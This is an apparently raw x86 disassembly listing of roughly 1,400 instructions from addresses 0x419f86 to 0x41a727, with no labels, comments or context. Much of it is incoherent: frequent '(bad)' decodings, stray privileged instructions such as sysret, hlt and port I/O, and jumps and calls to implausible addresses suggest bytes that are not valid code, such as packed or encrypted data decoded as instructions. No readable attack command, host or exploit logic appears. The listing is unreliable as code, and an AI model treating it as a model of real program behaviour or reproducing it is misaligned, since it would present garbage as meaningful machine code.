  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
